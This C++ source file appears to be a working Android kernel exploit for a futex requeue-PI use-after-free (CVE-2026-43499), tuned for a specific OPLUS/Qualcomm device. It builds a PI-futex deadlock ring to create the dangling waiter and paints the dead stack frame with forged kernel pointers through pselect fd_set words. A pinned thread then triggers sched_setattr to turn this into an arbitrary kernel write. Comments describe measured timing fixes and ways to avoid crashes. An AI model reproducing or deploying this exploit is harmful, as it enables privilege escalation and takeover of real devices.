//
// CVE-2026-43499 canvas route, in-process 64-bit, reference model with the
// PLF110-calibrated word map:
//
//   waiter:  LOCK_PI(chain) -> park in WAIT_REQUEUE_PI(f_wait -> f_pi_target)
//   owner:   LOCK_PI(f_pi_target) -> block in LOCK_PI(chain)   [ring closed]
//   main:    usleep(100ms) -> CMP_REQUEUE_PI(f_wait) -> -EDEADLK = UAF born
//   waiter:  wakes, runs the route ITSELF: paint the waiter words, dup a
//            pipe write-end onto every selected fd, one pselect, then a
//            USER-MODE spin keeping the seq live -- the consumer fires
//            sched_setattr at the dead frame until one returns 0.
//
// PLF110 map (calibrated): waiter = S-0x198, array = S-0x200 -> tree_pc at
// global word 13 (shift 11). Words 13/14 are ex inputs; words 15-22 are the
// res mirrors, which with all-writable selected fds equal the inputs.
//
#include "futex_probe.h"
#include "aliases.h"
#include <pthread.h>
#include <unistd.h>
#include <android/log.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <linux/futex.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <cstdio>
#include <cstring>
#include <cerrno>
#include <ctime>
#include <atomic>
#include <sys/select.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define LOG_TAG "oplus_ace5"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)

#define PSELECT_ROUTE_NFDS 320
#define PSELECT_TIMEOUT_SEC 5
#define FAKE_WAITER_PRIO 130
#define WORDS_PER_SET 5

static int g_shift = 11;   // PLF110 calibrated: tree_pc@13

namespace {

/* Per-round futex words (pointers into a fresh mmap page allocated by each
 * gl_round). The previous round's owner thread still HOLDS the old page's PI
 * locks -- its threads park forever, we never tear down. The old teardown
 * (UNLOCK_PI + owner exit) made exit_pi_state release f_pi_target and
 * mark_wakeup() walk the stale proxy waiter into BUG_ON(w->lock != lock),
 * killing the NEXT round ~50% of the time (measured: round1 landed 5/5,
 * every later round a coin flip). Fresh page = fresh futex keys: the parked
 * holders are never walked. */
uint32_t *f_wait, *f_pi_target, *f_pi_chain;

std::atomic<int> waiter_tid{0};
std::atomic<int> waiter_ready{0};
std::atomic<int> waiter_waiting{0};
std::atomic<int> owner_started{0};
std::atomic<int> owner_chain_done{0};
std::atomic<int> route_done{0};
std::atomic<int> punch_consume_go{0};
std::atomic<int> punch_consume_stop{0};
std::atomic<int> consumer_armed{0};
std::atomic<int> consumer_calls{0};
std::atomic<int> consumer_success{0};
std::atomic<int> route_live{0};   // pselect returned: res mirror is filled
std::atomic<int> waiter_locked{0}; // waiter holds the chain this round
std::atomic<uint64_t> pselect_enter_ns{0};
std::atomic<uint64_t> pselect_return_ns{0};
std::atomic<uint64_t> fire_ns{0};

uint64_t g_write_value, g_write_target, g_word_lock, g_word_task;
int g_fire_nice = 1;
int g_waiter_cpu = 4, g_fire_cpu = 5, g_owner_cpu = 6;
uint64_t g_fire_delay_ns = 0;
int g_trace_fd = -1, g_trace_fd2 = -1;
// glshell links this TU; keep the symbol visible

void trace_line(const char *tag, long a, long b) {
    char buf[64];
    int n = snprintf(buf, sizeof(buf), "%s %ld %ld\n", tag, a, b);
    if (g_trace_fd2 >= 0) write(g_trace_fd2, buf, n);
    if (g_trace_fd >= 0) write(g_trace_fd, buf, n);
}

uint64_t monotonic_ns() {
    struct timespec ts{};
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t) ts.tv_sec * 1000000000ull + (uint64_t) ts.tv_nsec;
}

long xfutex(uint32_t *u, int op, uint32_t val, void *ts, uint32_t *u2, uint32_t v3) {
    return syscall(SYS_futex, u, op, val, ts, u2, v3);
}

struct sched_attr_packed {
    uint32_t size, policy;
    uint64_t flags;
    int32_t nice;
    uint32_t prio;
    uint64_t rt, dl, period;
} __attribute__((packed));

long sched_setattr_tid(pid_t tid, int nice) {
    sched_attr_packed sa;
    memset(&sa, 0, sizeof(sa));
    sa.size = 48;
    sa.policy = 0;
    sa.nice = nice;
    return syscall(SYS_sched_setattr, tid, &sa, 0);
}

void fdset_put_word(fd_set *set, int word, uint64_t value) {
    auto *bits = (unsigned long *) set;
    bits[word] = (unsigned long) value;
}

/* Words 0-14 are verbatim inputs; words 15-29 are res mirrors that equal the
 * inputs when every selected fd is writable (pipe write-end dup). So a
 * global word in 15-29 is painted by writing its mirrored input word. */
int pselect_put_global_word(fd_set *in, fd_set *out, fd_set *ex,
                            int global_word, uint64_t value) {
    if (global_word < 0 || global_word >= 30) return 0;
    if (global_word < 15) {
        int set_idx = global_word / WORDS_PER_SET;
        int word_idx = global_word % WORDS_PER_SET;
        switch (set_idx) {
            case 0: fdset_put_word(in, word_idx, value); return 1;
            case 1: fdset_put_word(out, word_idx, value); return 1;
            case 2: fdset_put_word(ex, word_idx, value); return 1;
        }
        return 0;
    }
    int m = global_word - 15;
    if (m < 5) { fdset_put_word(in, m, value); return 1; }
    m -= 5;
    if (m < 5) { fdset_put_word(out, m, value); return 1; }
    m -= 5;
    if (m < 5) { fdset_put_word(ex, m, value); return 1; }
    return 0;
}

void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
    FD_ZERO(in);
    FD_ZERO(out);
    FD_ZERO(ex);
    /* DISAMBIGUATION paint: out[0] = a value whose only set fd bit (7) is
     * CLOSED, so the direct slot reads 0xAA000080 while the res mirror
     * reads 0 (not ready). The lock slot's fault value then names which:
     * 0xAA000080 -> direct word 5 (W=-2), NULL -> mirror word 20 (W=13). */
    fdset_put_word(out, 0, 0xAA000080ull);
    fdset_put_word(in, 0, 0xAA000015ull);   // in[0]: mirror target word 15
    struct { int word; uint64_t value; const char *name; } words[] = {
        {2,  g_write_value,  "tree_pc"},
        {3,  0,               "tree_right"},
        {4,  g_write_target,  "tree_left"},
        {5,  g_write_value,   "pi_parent"},
        {6,  0,               "pi_right"},
        {7,  g_write_target,  "pi_left"},
        {8,  g_word_task,     "task"},
        {9,  g_word_lock,     "lock"},
        /* PLF110 landed the fops write with wake_state=0; unlike Pixel's
         * state=3 this also avoids a vendor wakeup of the aliased init task. */
        {10, ((uint64_t) FAKE_WAITER_PRIO << 32) | 0, "wake_prio"},
        {11, 0,               "deadline"},
        {12, 0,               "ww_ctx"},
    };
    for (auto &w : words) {
        if (!pselect_put_global_word(in, out, ex, g_shift + w.word, w.value))
            LOGI("pselect cannot place %s (global=%d)", w.name, g_shift + w.word);
    }
}

/* Reference slide612: result words are (input & readiness), so painting
 * the res chunks needs POLLIN|POLLOUT|POLLPRI on every pass -- a TCP
 * loopback peer carrying one queued data byte plus one MSG_OOB byte. A
 * pipe write-end only gives POLLOUT, which zeroes res_in (the measured
 * NULL-lock). Returns the CLIENT end: readable, writable, exceptional. */
int make_tcp_ready_fd() {
    int ls = socket(AF_INET, SOCK_STREAM, 0);
    if (ls < 0) return -1;
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_addr.s_addr = htonl(0x7f000001);
    if (bind(ls, (struct sockaddr *) &a, sizeof(a)) != 0 ||
        listen(ls, 1) != 0) { close(ls); return -1; }
    socklen_t alen = sizeof(a);
    if (getsockname(ls, (struct sockaddr *) &a, &alen) != 0) { close(ls); return -1; }
    int c = socket(AF_INET, SOCK_STREAM, 0);
    if (c < 0) { close(ls); return -1; }
    if (connect(c, (struct sockaddr *) &a, sizeof(a)) != 0) { close(c); close(ls); return -1; }
    int srv = accept(ls, nullptr, nullptr);
    close(ls);
    if (srv < 0) { close(c); return -1; }
    send(srv, "A", 1, 0);
    send(srv, "!", 1, MSG_OOB);
    close(srv);
    return c;   // client end: readable + writable + exceptional
}

void open_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int ready_fd) {
    for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
        if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
            dup2(ready_fd, fd);
        }
    }
}

void *consumer_thread(void *) {
    prctl(PR_SET_NAME, "gl_fire", 0, 0, 0);
    /* Pin: the fire latency (route_live -> sched_setattr) must not depend
     * on scheduler bounce across busy CPUs -- every microsecond of delay
     * is a softirq/boost window that can smear the dead frame. */
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(g_fire_cpu, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);
    int seen = 0, calls = 0;
    while (!punch_consume_stop.load(std::memory_order_relaxed)) {
        int seq = punch_consume_go.load(std::memory_order_relaxed);
        if (seq == 0 || seq == seen) {
            /* Stay off the app cgroup's CPU quota until a route is ready.
             * Burning CPU throughout the ~100 ms requeue setup caused the
             * vendor scheduler to throttle this thread for about 2 ms at the
             * exact moment the pselect frame became live. */
            xfutex((uint32_t *) &punch_consume_go, FUTEX_WAIT_PRIVATE,
                   (uint32_t) seq, nullptr, nullptr, 0);
            continue;
        }
        seen = seq;
        consumer_armed.store(seq, std::memory_order_release);
        int tid = waiter_tid.load(std::memory_order_relaxed);
        /* Mirror words (15-22) are ZERO while the pselect is parked -- the
         * res sets are only filled when do_select returns. A fire during the
         * park reads lock=0 and NULL-derefs (measured). Fire only after
         * the painter reports the frame returned.
         * Yield-spin, do NOT sleep: every microsecond between pselect
         * return and the fire is a window for an IRQ on the waiter's CPU
         * to smear the painted dead frame (measured as write-miss). */
        while (!route_live.load(std::memory_order_acquire) &&
               punch_consume_go.load(std::memory_order_relaxed) == seq) {
            /* Never sleep here.  On PLF110 a nominal usleep(50) wakes about
             * 2 ms later under the vendor scheduler, while the pselect frame
             * survives for only a few microseconds after return. */
            /* ARM YIELD is only a hint and Qualcomm may defer the hardware
             * thread until a later interrupt (~2 ms observed).  This window
             * needs a real busy poll, so use NOP plus a compiler barrier. */
            __asm__ volatile("nop" ::: "memory");
        }
        if (route_live.load(std::memory_order_relaxed) &&
            punch_consume_go.load(std::memory_order_relaxed) == seq) {
            /* ONE fire per route (reference CONSUMER_MAX_CALLS=1): the walk
             * consumes the canvas, and a second fire would walk the consumed
             * frame -- measured as the NULL-deref on the run before this. */
            int nice = g_fire_nice;
            if (g_fire_delay_ns) {
                uint64_t deadline = pselect_return_ns.load(std::memory_order_acquire)
                                    + g_fire_delay_ns;
                while (monotonic_ns() < deadline)
                    __asm__ volatile("nop" ::: "memory");
            }
            fire_ns.store(monotonic_ns(), std::memory_order_relaxed);
            errno = 0;
            long r = sched_setattr_tid(tid, nice);
            int fire_errno = errno;
            /* No file/log syscall is allowed before sched_setattr.  The old
             * pre-fire trace write cost 2-3 ms and destroyed the dead stack
             * frame before the constrained write could walk it. */
            trace_line("FIRE", calls, tid);
            calls++;
            atomic_store_explicit(&((std::atomic<int> &) consumer_calls), calls,
                                  std::memory_order_relaxed);
            LOGI("consumer sched_setattr ret=%ld errno=%d nice=%d", r, fire_errno, nice);
            if (r == 0) consumer_success.store(1);
            /* One fire per consumer, then park: a spinning leftover consumer
             * burns a pinned CPU forever (heat) and its go-seq view is stale. */
            for (;;) pause();
        }
    }
    return nullptr;
}

void *waiter_thread(void *) {
    prctl(PR_SET_NAME, "gl_park", 0, 0, 0);
    cpu_set_t ws; CPU_ZERO(&ws); CPU_SET(g_waiter_cpu, &ws);
    sched_setaffinity(0, sizeof(ws), &ws);
    waiter_tid.store((int) syscall(SYS_gettid));

    waiter_ready.store(1);

    {
        if (xfutex(f_pi_chain, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0) != 0)
            LOGI("waiter lock chain errno=%d", errno);
        waiter_locked.store(1, std::memory_order_release);

        while (!owner_started.load() && !punch_consume_stop.load()) usleep(1000);
        if (punch_consume_stop.load()) { for (;;) pause(); }

        struct timespec timeout;
        clock_gettime(CLOCK_MONOTONIC, &timeout);
        timeout.tv_nsec += 150000000;
        if (timeout.tv_nsec >= 1000000000L) {
            timeout.tv_nsec -= 1000000000L;
            timeout.tv_sec += 1;
        }
        waiter_waiting.store(1);
        errno = 0;
        long wr = xfutex(f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                         f_pi_target, 0);
        LOGI("waiter: WAIT_REQUEUE_PI ret=%ld errno=%d", wr, errno);

        int ready_fd = make_tcp_ready_fd();
        if (ready_fd < 0) { route_done.store(1); for (;;) pause(); }
        fd_set in, out, ex;
        prepare_pselect_fdsets(&in, &out, &ex);
        open_selected_fds(&in, &out, &ex, ready_fd);

        consumer_calls.store(0);
        consumer_success.store(0);
        route_live.store(0, std::memory_order_release);
        int seq = punch_consume_go.load(std::memory_order_relaxed) + 1;
        punch_consume_go.store(seq, std::memory_order_release);
        xfutex((uint32_t *) &punch_consume_go, FUTEX_WAKE_PRIVATE,
               1, nullptr, nullptr, 0);
        /* Do not enter pselect until the consumer is awake, scheduled on its
         * dedicated CPU, and spinning on route_live. */
        while (consumer_armed.load(std::memory_order_acquire) != seq)
            __asm__ volatile("yield" ::: "memory");

        struct timespec ts = {PSELECT_TIMEOUT_SEC, 0};
        pselect_enter_ns.store(monotonic_ns(), std::memory_order_relaxed);
        errno = 0;
        int ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, &ts, nullptr);
        int saved = errno;
        pselect_return_ns.store(monotonic_ns(), std::memory_order_relaxed);
        route_live.store(1, std::memory_order_release);

        /* USER-MODE spin: not one syscall may touch this stack until the
         * consumer has fired on the dead frame. */
        unsigned long n = 0;
        while (n++ < 2000000000UL) {
            if (consumer_success.load(std::memory_order_relaxed) ||
                punch_consume_stop.load(std::memory_order_relaxed)) break;
        }
        punch_consume_go.store(0);
        route_live.store(0, std::memory_order_release);
        LOGI("pselect ret=%d errno=%d calls=%d success=%d shift=%d",
             ret, saved, consumer_calls.load(), consumer_success.load(), g_shift);
        trace_line("RSLT", consumer_calls.load(), consumer_success.load());
        trace_line("TIME",
                   (long) (pselect_return_ns.load() - pselect_enter_ns.load()),
                   (long) (fire_ns.load() - pselect_return_ns.load()));

        close(ready_fd);
        route_done.store(1);

        /* Payload main.c structure: UNLOCK the chain so the blocked owner
         * acquires and returns to userspace. Leaving the owner blocked in
         * FUTEX_LOCK_PI (D state) made the kernel hung_task detector
         * panic the box ~2-4 minutes later -- measured: even an idle parked
         * process (pure pause()) died, so the bomb was never glshell. */
        xfutex(f_pi_chain, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
        while (!owner_chain_done.load() && !punch_consume_stop.load())
            usleep(1000);
        for (;;) pause();
    }
    return nullptr;
}

void *owner_thread(void *) {
    prctl(PR_SET_NAME, "gl_owner", 0, 0, 0);
    cpu_set_t os; CPU_ZERO(&os); CPU_SET(g_owner_cpu, &os);
    sched_setaffinity(0, sizeof(os), &os);
    while (!waiter_locked.load(std::memory_order_acquire) &&
           !punch_consume_stop.load()) usleep(1000);
    if (!punch_consume_stop.load()) {
        if (xfutex(f_pi_target, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0) != 0)
            LOGI("owner lock target errno=%d", errno);
        owner_started.store(1);
        xfutex(f_pi_chain, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0);  // blocks
        owner_chain_done.store(1);
        /* Woken by the waiter's UNLOCK (Payload main.c). PARK in a
         * USERSPACE sleep loop: never exit (f_pi_target stays held so the
         * requeue proxy is never walked), and never sit blocked in the
         * kernel (hung_task detector). */
        for (;;) sleep(1);
    }
    return nullptr;
}

}  // namespace

/* The requeue op runs on a throwaway thread that parks afterwards. Running
 * it on the orchestrator (child_main) left the orchestrator's own PI state
 * pointing into its ACTIVE stack; an OPLUS boost walking it between rounds
 * reads live-stack garbage and panics (measured: all fires complete, crash
 * before the next round's RQ line). A parked thread's dead frame stays
 * frozen, so later re-walks of it are idempotent. */
namespace {
struct RqArg { long ret = 0; int e = 0; std::atomic<int> done{0}; };
void *requeue_thread(void *arg) {
    auto *a = (RqArg *) arg;
    cpu_set_t set; CPU_ZERO(&set); CPU_SET(g_waiter_cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);
    usleep(100000);
    errno = 0;
    a->ret = xfutex(f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *) 1,
                    f_pi_target, 0);
    a->e = errno;
    a->done.store(1, std::memory_order_release);
    for (;;) pause();
    return nullptr;
}
}  // namespace

GlRoundOut gl_round(const GlRoundCfg &cfg) {
    GlRoundOut out{};
    g_trace_fd = cfg.trace_fd;
    g_trace_fd2 = cfg.trace_fd2;
    g_write_value = cfg.value;
    g_write_target = cfg.target;
    g_word_lock = cfg.lock_addr;
    g_word_task = cfg.task_addr ? cfg.task_addr : AL_INIT_TASK;
    g_fire_nice = cfg.fire_nice;
    g_waiter_cpu = cfg.waiter_cpu;
    g_fire_cpu = cfg.fire_cpu;
    g_owner_cpu = cfg.owner_cpu;
    g_fire_delay_ns = cfg.fire_delay_ns;

    /* Fresh triangle + fresh threads EVERY round (the reference runs one
     * round per process): reusing them deadlocks round 2 -- the owner keeps
     * the chain and re-locks its own f_pi_target (EDEADLK self). The words
     * live on a fresh page so the parked previous round's held locks are
     * keyed to addresses nobody touches again. */
    {
        uint32_t *page = (uint32_t *) mmap(nullptr, 4096,
                                           PROT_READ | PROT_WRITE,
                                           MAP_PRIVATE | MAP_ANONYMOUS,
                                           -1, 0);
        if (page == MAP_FAILED) { out.note = "futex page mmap failed"; return out; }
        f_wait     = page;
        f_pi_target = page + 1;
        f_pi_chain  = page + 2;
    }
    waiter_tid.store(0);
    waiter_ready.store(0);
    waiter_locked.store(0);
    waiter_waiting.store(0);
    owner_started.store(0);
    owner_chain_done.store(0);
    route_done.store(0);
    route_live.store(0);
    punch_consume_go.store(0);
    punch_consume_stop.store(0);
    consumer_armed.store(0);
    consumer_calls.store(0);
    consumer_success.store(0);
    pselect_enter_ns.store(0);
    pselect_return_ns.store(0);
    fire_ns.store(0);

    pthread_t waiter, owner, consumer;
    pthread_create(&waiter, nullptr, waiter_thread, nullptr);
    pthread_create(&owner, nullptr, owner_thread, nullptr);
    pthread_create(&consumer, nullptr, consumer_thread, nullptr);
    while (!waiter_ready.load()) usleep(1000);
    while (!waiter_waiting.load() || !owner_started.load()) usleep(1000);

    RqArg rq{};
    pthread_t rqt;
    pthread_create(&rqt, nullptr, requeue_thread, &rq);
    while (!rq.done.load(std::memory_order_acquire)) usleep(1000);
    out.requeue_ret = rq.ret;
    out.requeue_errno = rq.e;
    out.bug_path = (rq.ret == -1 && rq.e == EDEADLK);
    LOGI("requeue ret=%ld errno=%d bug_path=%d", rq.ret, rq.e, (int) out.bug_path);
    trace_line("RQ", rq.ret, rq.e);
    if (!out.bug_path) {
        out.note = rq.ret >= 0 ? "requeue moved the waiters: no UAF created"
                               : "requeue failed with an unexpected errno";
        punch_consume_stop.store(1);
        return out;
    }

    long t0 = time(nullptr);
    while (time(nullptr) - t0 < cfg.wait_timeout_ms / 1000 + PSELECT_TIMEOUT_SEC + 2) {
        if (route_done.load()) break;
        usleep(10000);
    }
    out.observed = consumer_success.load() > 0;
    out.fires = consumer_calls.load();
    if (!out.observed && route_done.load())
        out.note = "route ran but no sched_setattr returned 0";
    return out;
}
/* file-scope export for shell_main (was internal) */

/* file-scope export: the atomics above live in the anonymous namespace */
void gl_set_trace_fd2(int fd) { g_trace_fd2 = fd; }
